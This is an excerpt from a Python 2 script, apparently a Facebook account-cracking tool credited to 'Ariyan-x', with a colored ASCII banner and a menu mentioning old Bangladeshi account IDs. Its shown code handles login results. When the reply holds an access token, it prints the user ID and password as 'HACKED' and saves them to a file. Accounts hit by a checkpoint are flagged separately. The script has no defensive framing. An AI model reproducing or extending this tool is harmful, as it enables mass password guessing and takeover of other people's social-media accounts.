...
print("""
 ...
 \033[0;94m   _   ___ _____   ___   _  _   __  __
  \033[0;94m /_\ | _ \_ _\ \ / /_\ | \| |__\ \/ /
  \033[0;96m/ _ \|   /| | \ V / _ \| .` |___>  < 
 \033[0;96m/_/ \_\_|_\___| |_/_/ \_\_|\_|  /_/\_\
""")

print("\033[0;91mThis Tool's Free By Ariyan-x")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : ARIYAN-X'
    print '\033[0;94mFACEBOOK : BlANK'
    print '\033[0;96mGITHUB   : Ariyan404'
    print ''
    print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE OLD ID JAST OPANAVAILABLE'
    print '\033[0;91m'
    print 50* '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Ariyan-x-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[Ariyan-x-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
